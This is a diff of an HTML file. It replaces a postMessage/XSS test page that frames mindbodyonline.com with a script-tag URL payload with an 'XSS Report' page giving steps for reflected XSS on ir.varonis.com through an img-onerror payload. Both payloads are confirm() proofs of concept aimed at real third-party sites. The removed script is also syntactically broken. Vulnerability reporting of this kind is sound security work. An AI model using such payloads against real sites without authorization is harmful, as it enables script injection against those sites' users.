@@ -1,21 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>PostMessage Attack Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Report</title>
 </head>
 <body>
-  <iframe src="https://www.mindbodyonline.com/business/education?term_vertical=All&term_topics=<script>confirm(1)</script>&term_asset_type=534&page=4" width="100%" height="600"></iframe>
-  <script>
-    window.onload = function() {
-      let maliciousData = {
-        isPostaMessage: true,
-        topic: "malicious-topic",
-        content: "<script>confirm(1)
-      };
-
-      // Send the malicious message to the iframe
-      document.querySelector('iframe').contentWindow.postMessage(maliciousData, "https://www.mindbodyonline.com");
-    };
-  </script>
+    <h1>XSS Report</h1>
+    <p>This is a demonstration of a Cross-Site Scripting (XSS) vulnerability.</p>
+    <p>Follow the steps below:</p>
+    <ol>
+        <li>Go to the Varonis Overview Page by clicking <a href="https://ir.varonis.com/overview/default.aspx">here</a>.</li>
+        <li>In the search bar, type <code>hello</code> and press Enter.</li>
+        <li>Once the results are displayed, append the following payload to the URL and press Enter again:</li>
+        <code>?q=<img src="invalid.jpg" onerror=confirm('xss')></code>
+        <li>Observe the confirmation dialog (popup) indicating the execution of injected JavaScript.</li>
+    </ol>
 </body>
 </html>
